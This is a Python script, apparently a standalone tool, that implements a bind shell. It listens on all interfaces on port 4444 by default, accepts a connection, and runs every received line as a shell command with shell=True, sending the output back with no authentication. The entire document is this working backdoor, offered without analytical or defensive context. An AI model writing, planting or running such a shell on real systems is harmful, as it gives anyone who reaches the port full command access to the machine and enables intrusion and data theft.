import socket
import click
import subprocess
import os

def cmd_run(command):
    output = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    if output.stderr.decode():
        return output.stderr
    return output.stdout


@click.command()
@click.option(
    "--port", "-p", default=4444, help="set the in which the shell will be listening on"
)
def main(port):
    ip = "0.0.0.0"
    target = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    target.bind((ip, port))
    target.listen(1)
    clinet_socket, addr = target.accept()
    while True:
        chunks = []
        while True:
            chunk = clinet_socket.recv(1024)
            chunks.append(chunk)
            if chunk and chunk.decode()[-1] == "\n": # first check if there is a chunk then check if it ends with '\n' other wise the condition will try to check an empty chunk which will raise an error. 
                break
            if not chunk:
                break

        command = (b"".join(chunks)).decode()[:-1]
        if command[0:2]=="cd":
            try:
                os.chdir(command[2::].strip())
                clinet_socket.send(b"\n")
                continue
            except Exception as e:
                clinet_socket.sendall((str(e)+'\n').encode())
                continue


        if command.strip() == "exit":
            clinet_socket.send(b"exit")
            clinet_socket.close()
            break
        output = cmd_run(command)
        output = output+b'\n' if output[-1]!=10 else output
        clinet_socket.sendall(output)
    target.close()

if __name__ == "__main__":
    main()
